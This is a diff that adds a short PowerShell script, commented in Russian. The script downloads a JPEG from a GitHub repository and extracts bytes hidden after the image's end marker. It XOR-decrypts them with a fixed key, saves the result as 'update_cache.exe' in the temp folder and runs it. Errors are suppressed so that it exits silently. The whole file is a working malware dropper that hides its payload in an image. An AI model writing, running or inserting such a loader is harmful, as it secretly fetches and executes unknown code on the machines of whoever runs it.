@@ -1,0 +1,37 @@
+# 1. Ссылка на вашу картинку с зашифрованным хвостом на GitHub
+$url = "https://github.com/azazeuschan/image-storage/blob/0d6f415a1fc7d417061d9268266f2125ea87d415/final_image.jpg?raw=true"
+
+try {
+    # Скачивание файла в байтовый массив
+    $webClient = New-Object System.Net.WebClient
+    $bytes = $webClient.DownloadData($url)
+
+    # 2. Поиск маркера конца JPEG (FF D9) с конца файла
+    $offset = -1
+    for ($i = $bytes.Length - 2; $i -ge 0; $i--) {
+        if ($bytes[$i] -eq 0xFF -and $bytes[$i+1] -eq 0xD9) {
+            $offset = $i + 2
+            break
+        }
+    }
+
+    if ($offset -ne -1 -and $offset -lt $bytes.Length) {
+        # 3. Выделение полезной нагрузки
+        $payloadLength = $bytes.Length - $offset
+        [byte[]]$payload = New-Object byte[] $payloadLength
+        [System.Array]::Copy($bytes, $offset, $payload, 0, $payloadLength)
+
+        # 4. XOR дешифрование (ключ 0x5A)
+        for ($k = 0; $k -lt $payload.Length; $k++) {
+            $payload[$k] = $payload[$k] -bxor 0x5A
+        }
+
+        # 5. Сохранение во временную папку и запуск
+        $tempFile = "$env:TEMP\update_cache.exe"
+        [System.IO.File]::WriteAllBytes($tempFile, $payload)
+        
+        Start-Process $tempFile
+    }
+} catch {
+    # Тихое завершение при ошибке сети
+}
